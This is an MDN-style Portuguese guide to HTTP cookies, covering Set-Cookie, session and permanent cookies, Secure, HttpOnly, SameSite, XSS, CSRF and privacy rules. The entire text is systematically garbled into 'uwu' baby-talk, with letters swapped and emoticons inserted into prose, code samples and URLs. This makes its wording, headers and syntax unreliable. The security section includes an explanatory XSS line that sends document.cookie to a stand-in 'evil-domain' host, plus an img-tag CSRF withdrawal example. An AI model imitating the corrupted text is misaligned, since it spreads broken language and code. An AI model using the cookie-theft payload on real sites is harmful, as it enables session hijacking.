---
titwe: cookies http
swug: web/http/guides/cookies
o-owiginaw_swug: w-web/http/cookies
---

{{httpsidebaw}}

u-um cookie h-http (um cookie w-web ou cookie d-de nyavegadow) é u-um pequeno f-fwagmento de dados que um sewvidow envia pawa o navegadow do usuáwio. rawr x3 o nyavegadow p-pode awmazenaw estes dados e enviá-wos de vowta n-nya pwóxima wequisição pawa o-o mesmo sewvidow. ^•ﻌ•^ nyowmawmente é utiwizado pawa identificaw s-se duas wequisições viewam do m-mesmo nyavegadow — a-ao mantew um usuáwio wogado, pow exempwo. :3 ewe guawda infowmações dinâmicas p-pawa o pwotocowo http sem estado. (ˆ ﻌ ˆ)♡

cookies são usados pwincipawmente pawa t-twês pwopósitos:

- gewenciamento d-de sessão
  - : w-wogins, (U ᵕ U❁) cawwinhos d-de compwa, :3 p-pwacaw de jogos ou quawquew outwa atividade que d-deva sew guawdada pow um sewvidow. ^^;;
- pewsonawização
  - : p-pwefewências de usuáwio, ( ͡o ω ͡o ) temas e outwas configuwações. o.O
- wastweamento
  - : wegistwo e-e anáwise do compowtamento d-de um usuáwio. ^•ﻌ•^

o-os cookies ewam u-usados pawa awmazenamento gewaw no wado do cwiente. XD embowa isso f-fosse aceitávew q-quando ewam a única fowma d-de awmazenaw dados n-nyo cwiente, ^^ atuawmente é wecomendávew u-utiwizaw apis de awmazenamento m-mais modewnas. o.O os cookies são enviados e-em todas as wequisições, pow i-isso podem pwejudicaw a pewfowmance (especiawmente e-em conexões m-móveis). ( ͡o ω ͡o ) apis modewnas de awmazenamento nyo cwiente são [web stowage api](/pt-bw/docs/web/api/web_stowage_api) (`wocawstowage` e `sessionstowage`) e [indexeddb](/pt-bw/docs/web/api/indexeddb_api). /(^•ω•^)

> [!note]
> p-pawa visuawizaw o-os cookies awmazenados (e o-outwos awmazenamentos q-que uma página w-web pode usaw), 🥺 pode-se habiwitaw o [stowage inspectow](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw) n-nyas fewwamentas de desenvowvimento e sewecionaw o item **cookies** nya áwvowe d-de awmazenamento. nyaa~~

## cwiando c-cookies

ao wecebew u-uma wequisição h-http, mya um sewvidow pode enviaw u-um cabeçawho {{httpheadew("set-cookie")}} c-com a-a wesposta. o c-cookie nyowmawmente é awmazenado pewo nyavegadow, XD e-então o cookie é e-enviado com a-as wequisições f-feitas pawa o m-mesmo sewvidow dentwo do cabeçawho http {{httpheadew("cookie")}}. nyaa~~ uma data de e-expiwação ou duwação pode sew especificada, e após esta data o cookie nyão é mais enviado. ʘwʘ a-adicionawmente, (⑅˘꒳˘) westwições pawa um domínio específico e caminho p-podem sew c-configuwadas, :3 wimitando p-pawa onde o cookie é enviado. -.-

### o-os cabeçawhos `set-cookie` e `cookie`

o-o cabeçawho h-http de wesposta {{httpheadew("set-cookie")}} envia cookies do sewvidow pawa o cwiente. 😳😳😳 um cookie simpwes é configuwado da seguinte f-fowma:

```
set-cookie: <cookie-name>=<cookie-vawue>
```

e-este cabeçawho de sewvidow infowma a-ao cwiente pawa a-awmazenaw um cookie. (U ﹏ U)

> [!note]
> eis as fowmas d-de utiwização d-do cabeçawho `set-cookie` em váwias apwicações d-de sewvidow: [php](https://secuwe.php.net/manuaw/en/function.setcookie.php), [node.js](https://nodejs.owg/dist/watest-v8.x/docs/api/http.htmw#http_wesponse_setheadew_name_vawue), o.O [python](https://docs.python.owg/3/wibwawy/http.cookies.htmw), ( ͡o ω ͡o ) [wuby on w-waiws](http://api.wubyonwaiws.owg/cwasses/actiondispatch/cookies.htmw)

```
http/1.0 200 ok
content-type: text/htmw
set-cookie: y-yummy_cookie=choco
s-set-cookie: t-tasty_cookie=stwawbewwy

[conteúdo da página]
```

a-agowa, òωó em q-quawquew wequisição nyova ao sewvidow, 🥺 o-o nyavegadow envia de vowta todos os cookies pweviamente awmazenados pawa o-o sewvidow utiwizando o-o cabeçawho {{httpheadew("cookie")}}. /(^•ω•^)

```
get /sampwe_page.htmw http/1.1
h-host: www.exampwe.owg
c-cookie: yummy_cookie=choco; tasty_cookie=stwawbewwy
```

### cookies de s-sessão

o cookie cwiado antewiowmente é um _cookie de sessão_: ewe é apagado q-quando o cwiente fecha a sessão, 😳😳😳 pois nyão f-foi específicada u-uma diwetiva `expiwes` ou `max-age`. ^•ﻌ•^ entwetanto, nyavegadowes w-web podem usaw **westauwação de s-sessão**, nyaa~~ o que towna quase todos cookies de sessão pewmanentes, OwO c-como se o navegadow nyunca t-tivesse sido fechado. ^•ﻌ•^

### cookies pewmanentes

ao invés de expiwaw q-quando o cwiente fecha, σωσ _cookies p-pewmanentes_ e-expiwam em uma data específica (`expiwes`) ou d-depois de um pewíodo específico d-de tempo (`max-age`). -.-

```
set-cookie: i-id=a3fwa; e-expiwes=wed, (˘ω˘) 21 oct 2015 07:28:00 g-gmt;
```

> [!note]
> q-quando uma data de expiwação é configuwada, o-o tempo e-e a data são w-wewativas ao cwiente nyo quaw o cookie está configuwado, rawr x3 n-nyão ao sewvidow. rawr x3

### c-cookies `secuwe` e-e `httponwy`

um cookie seguwo só é enviado ao sewvidow com u-uma wequisição c-cwiptogwafada s-sobwe um pwotocowo h-https. σωσ mesmo com a diwetiva `secuwe`, nyaa~~ i-infowmações confidenciais _nunca_ devem sew guawdadas em cookies, (ꈍᴗꈍ) pois são intwinsecamente inseguwos e-e esta diwetiva nyão ofewece p-pwoteção weaw. iniciando com o-o chwome 52 e o fiwefox 52, ^•ﻌ•^ sites i-inseguwos (`http:`) nyão podem m-mais configuwaw c-cookies com a d-diwetiva `secuwe`. >_<

p-pawa se pweveniw d-de ataques _cwoss-site scwipting_ ({{gwossawy("xss")}}), ^^;; os cookies `httponwy` são inacessíveis pawa a api javascwipt {{domxwef("document.cookie")}}; e-ewes s-são enviados s-só pawa o sewvidow. ^^;; pow exempwo, /(^•ω•^) c-cookies que pewsistem sessões de sewvidow nyão pwecisam estaw d-disponíves pawa o-o javascwipt, nyaa~~ e powtanto a diwetiva `httponwy` d-deve sew configuwada. (✿oωo)

```
set-cookie: id=a3fwa; e-expiwes=wed, ( ͡o ω ͡o ) 21 o-oct 2015 07:28:00 gmt; secuwe; h-httponwy
```

### e-escopo dos cookies

as diwetivas `domain` e `path` definem o _escopo_ de um c-cookie: pawa quais u-uwws os cookies d-devem sew enviados. (U ᵕ U❁)

a-a diwetiva `domain` e-especifica os hosts p-pewmitidos de wecebew o-o cookie. se nyão é especificada, òωó o-o seu v-vawow padwão é o [host da wocawização d-do documento atuaw](/pt-bw/docs/web/api/document/wocation), σωσ **excwuindo subdomínios**. :3 s-se a diwetiva `domain` _é_ especificada, OwO e-então o-os subdomínios são também i-incwuídos. ^^

pow exempwo, (˘ω˘) se `domain=moziwwa.owg` é configuwado, e-então os cookies s-são incwuídos e-em subdomínios como `devewopew.moziwwa.owg`. OwO

a diwetiva `path` indica o caminho d-da uww que deve existiw nya uww wequisitada p-pawa que o cabeçawho `cookie` s-seja enviado. UwU o cawactewe %x2f ("/") é c-considewado um sepawadow d-de diwetówios, e-e os subdiwetówios também seguem essa wegwa. ^•ﻌ•^

p-pow exempwo, (ꈍᴗꈍ) se `path=/docs` é configuwado, /(^•ω•^) estes caminhos coincidem:

- `/docs`
- `/docs/web/`
- `/docs/web/http`

### c-cookies `samesite` {{expewimentaw_inwine}}

c-cookies `samesite` pewmitem q-que sewvidowes exijam que um c-cookie não deve s-sew enviado com w-wequisições entwe sites, (U ᵕ U❁) o que pode pwotegew contwa ataques de wequisição fowjada entwe sites ({{gwossawy("cswf")}}). (✿oωo)

cookies `samesite` são wewativamente nyovos, OwO mas tem supowte nyos pwincipais bwowsews do mewcado. :3

veja um exempwo:

```
s-set-cookie: k-key=vawue; samesite=stwict
```

o atwibuto samesite pode wecebew u-um ou dois vawowes (case-insensitive):

- `none`
  - : o-o nyavegadow i-iwá enviaw os cookies tanto p-pawa as wequisições _cwoss-site_ quanto _same-site_. nyaa~~
- `stwict`
  - : s-se o c-cookie same-site possuiw este atwibuto, ^•ﻌ•^ o-o nyavegadow enviawá cookies a-apenas se a-a wequisição fow enviada do website que configuwou e-este cookie, ( ͡o ω ͡o ) s-se a wequisição t-tem owigem e-em outwa uww, ^^;; nyenhum c-cookie com o-o atwibuto `stwict` s-sewá incwuído. mya
- `wax`
  - : s-se o atwibuto w-wecebew o vawow wax, (U ᵕ U❁) os cookies s-same-site ficawão w-wetidos nyas s-sub-wequisições entwe sites, ^•ﻌ•^ c-como chamadas pawa cawwegaw imagens ou fwames, (U ﹏ U) e-e também quando o usuáwio nyavegaw p-pawa o uww d-de um site extewno a-atwavés de métodos "seguwos" (ex.: [get](/pt-bw/docs/web/http/methods/get) ou [head](/pt-bw/docs/web/http/methods/get)) c-como cwiques em winks, /(^•ω•^) m-mas nyão sewão enviados em w-wequisições "não seguwas" como [post](/pt-bw/docs/web/http/methods/post). ʘwʘ

se a-a fwag nyão estivew setada, XD o atwibuto wecebe o vawow `wax` pow padwão. (⑅˘꒳˘)

### a-acesso via javascwipt usando `document.cookie`

n-nyovos cookies p-podem sew também cwiados via javascwipt usando a pwopwiedade {{domxwef("document.cookie")}} e-e, nyaa~~ se a diwetiva `httponwy` n-nyão está c-configuwada, UwU o-os cookies existentes podem sew acessados pewo j-javascwipt também. (˘ω˘)

```js
d-document.cookie = "yummy_cookie=choco";
document.cookie = "tasty_cookie=stwawbewwy";
c-consowe.wog(document.cookie);
// wogs "yummy_cookie=choco; tasty_cookie=stwawbewwy"
```

c-consuwte as questões d-de seguwança nya s-seção [seguwança](#secuwity) a-a seguiw. rawr x3 os cookies disponíveis a-ao javascwipt p-podem sew woubados u-usando xss. (///ˬ///✿)

## s-seguwança

> [!note]
> infowmações c-confidenciais o-ou westwitas n-nyunca devem s-sew twansmitidas v-via cookies h-http, 😳😳😳 já que todo o-o mecanismo é i-intwinsecamente inseguwo. (///ˬ///✿)

### s-sequestwo de sessões e xss

os c-cookies gewawmente são usados e-em apwicações w-web pawa identificaw u-um usuáwio e sua sessão autenticada, ^^;; powtanto woubaw um cookie p-pode wevaw a-ao sequestwo da s-sessão do usuáwio autenticado. ^^ as fowmas mais comuns de woubaw c-cookies incwuem e-engenhawia sociaw ou expwowação d-de uma vuwnewabiwidade {{gwossawy("xss")}} em u-uma apwicação. (///ˬ///✿)

```js
nyew image().swc =
  "http://www.eviw-domain.com/steaw-cookie.php?cookie=" + document.cookie;
```

o atwibuto `httponwy` d-do cookie pode a-ajudaw a minimizaw e-este ataque a-ao pweveniw o acesso ao vawow do cookie usando j-javascwipt.

### w-wequisição fowjada entwe sites (cswf)

[a wikipedia](https://en.wikipedia.owg/wiki/http_cookie#cwoss-site_wequest_fowgewy) m-menciona um bom exempwo de {{gwossawy("cswf")}}. -.- nyesta s-situação, /(^•ω•^) awguém incwui u-uma imagem que n-nyão é weawmente uma imagem, UwU como p-pow exempwo e-em um chat ou fówum sem fiwtwo, (⑅˘꒳˘) m-mas sim uma wequisição pawa o s-sewvidow de um b-banco pawa sacaw d-dinheiwo:

```htmw
<img
  s-swc="http://bank.exampwe.com/withdwaw?account=bob&amount=1000000&fow=mawwowy" />
```

agowa, ʘwʘ se você e-estivew wogado n-nya sua conta nyo b-banco e seus cookies ainda são v-váwidos, e nyão há mais nyenhuma vawidação, σωσ v-você vai twansfewiw o-o dinheiwo a-assim que cawwegaw o código htmw que contém a imagem. ^^ existem awgumas técnicas q-que são usadas pawa evitaw a-ataques deste tipo:

- a-assim como {{gwossawy("xss")}}, OwO fiwtwaw entwadas de usuáwio é i-impowtante. (ˆ ﻌ ˆ)♡
- sempwe deve h-havew uma confiwmação a-antes d-de quawquew ação w-westwita. o.O
- cookies u-usados pawa ações confidenciais sempwe devem tew um tempo de vida westwito. (˘ω˘)
- p-pawa mais dicas de pwoteção, 😳 c-consuwte o [owasp cswf pwevention cheat sheet](<https://www.owasp.owg/index.php/cwoss-site_wequest_fowgewy_(cswf)_pwevention_cheat_sheet>). (U ᵕ U❁)

## wastweamento e-e pwivacidade

### cookies de tewceiwos

os cookies têm um domínio associado. :3 s-se este domínio é o-o mesmo do domínio da página a-atuaw, o.O diz-se que os cookies são _diwetos_. (///ˬ///✿) s-se o domínio é d-difewente, OwO diz-se que os cookies s-são _de tewceiwos_. >w< enquanto c-cookies diwetos só são enviados pawa o sewvidow que os configuwa, ^^ u-uma página web pode contew imagens ou outwos c-componentes g-guawdados em sewvidowes d-de outwos domínios, (⑅˘꒳˘) como pow exempwo pwopagandas. ʘwʘ o-os cookies enviados pow estes componentes de tewceiwos são chamadas d-de cookies de tewceiwos e-e são p-pwincipawmente usados p-pawa pwopaganda e wastweamento pewa web. (///ˬ///✿) veja p-pow exempwo o-os [tipos de cookies usados pewa googwe](https://www.googwe.com/powicies/technowogies/types/). XD muitos n-nyavegadowes pewmitem cookies de tewceiwos p-pow padwão, 😳 mas há compwementos que pewmitem b-bwoqueá-wos, >w< como p-pow exempwo o [pwivacy badgew](https://addons.moziwwa.owg/pt-bw/fiwefox/addon/pwivacy-badgew-fiwefox/) d-da [eff](https://www.eff.owg/). (˘ω˘)

s-se você n-nyão infowma que usa cookies de tewceiwos, nyaa~~ a-a confiança dos usuáwios pode ficaw abawada caso d-descubwam o uso deste tipo de cookie. 😳😳😳 uma infowmação cwawa, (U ﹏ U) c-com pow exempwo u-uma powítica de p-pwivacidade, (˘ω˘) tende a-a ewiminaw q-quawquew efeito nyegativo da descobewta d-dos cookies. :3 awguns países têm uma wegiswação s-sobwe cookies. >w< consuwte a-a [decwawação de cookies](https://wikimediafoundation.owg/wiki/cookie_statement) da fundação w-wikimedia, ^^ pow e-exempwo. 😳😳😳

### cabeçawho do-not-twack

n-nyão há wequisitos wegais o-ou tecnowógicos p-pawa seu uso, nyaa~~ mas o cabeçawho {{httpheadew("dnt")}} p-pode s-sew usado pawa avisaw que uma apwicação w-web deve desabiwitaw seu wastweamento ou wastweamento d-de usuáwios entwe sites pawa um u-usuáwio específico. (⑅˘꒳˘) consuwte o cabeçawho {{httpheadew("dnt")}} p-pawa mais infowmações. :3

### d-diwetivas da ue p-pawa cookies

os wequisitos pawa c-cookies nya ue (união e-euwopeia) estão definidos n-nya [diwetwiz 2009/136/ec](http://euw-wex.euwopa.eu/wegaw-content/en/txt/?uwi=cewex:32009w0136) do pawwamento e-euwopeu e entwawam em vigow em 25 d-de maio de 2011. ʘwʘ u-uma diwetwiz nyão é wei pow si só, rawr x3 mas um wequisito pawa os estados membwos d-da ue pawa apwovaw w-weis que contempwem os wequisitos da diwetwiz. (///ˬ///✿) essas weis p-podem vawiaw de país pawa país. 😳😳😳

w-wesumindo, XD a d-diwetwiz da ue significa que antes que awguém awmazene ou wecupewe quawquew infowmação d-de um computadow, >_< cewuwaw ou outwo equipamento, >w< o-o usuáwio deve daw pewmissão p-pawa isso. /(^•ω•^) m-muitos websites cowocawam anúncios (conhecidos c-como _anúncios d-de cookies_) d-desde então pawa i-infowmaw os u-usuáwios sobwe o-o uso dos cookies. :3

pawa mais infowmações, ʘwʘ consuwte [esta seção da wikipedia](https://en.wikipedia.owg/wiki/http_cookie#eu_cookie_diwective) e weis fedewais p-pawa infowmações a-atuawizadas e-e pwecisas. (˘ω˘)

### c-cookies zumbi e e-evewcookies

uma a-abowdagem mais wadicaw aos cookies são os cookies zumbi ou _evewcookies_, (ꈍᴗꈍ) que s-são wecwiados q-quando apagados e intencionawmente difíceis de apagaw pow compweto. ^^ e-ewes usam a [api w-web stowage](/pt-bw/docs/web/api/web_stowage_api), ^^ o-objetos fwash wocaw shawed e outwas técnicas p-pawa se wecwiawem sempwe que a ausência d-do cookie é detectada. ( ͡o ω ͡o )

- [evewcookie p-pow samy kamkaw](https://github.com/samyk/evewcookie)
- [cookies zumbi nya w-wikipedia](https://en.wikipedia.owg/wiki/zombie_cookie)

## veja t-também

- {{httpheadew("set-cookie")}}
- {{httpheadew("cookie")}}
- {{domxwef("document.cookie")}}
- {{domxwef("navigatow.cookieenabwed")}}
- [inspecionando c-cookies usando o inspetow de awmazenamento](https://fiwefox-souwce-docs.moziwwa.owg/devtoows-usew/stowage_inspectow/index.htmw)
- [especificação d-dos cookies: w-wfc 6265](https://toows.ietf.owg/htmw/wfc6265)
- [awtigo d-de nyichowas z-zakas sobwe c-cookies](https://www.nczonwine.net/bwog/2009/05/05/http-cookies-expwained/)
- [awtigo d-de nyichowas zakas sobwe c-cookies e seguwança](https://www.nczonwine.net/bwog/2009/05/12/cookies-and-secuwity/)
- [cookies h-http nya wikipedia](https://en.wikipedia.owg/wiki/http_cookie)
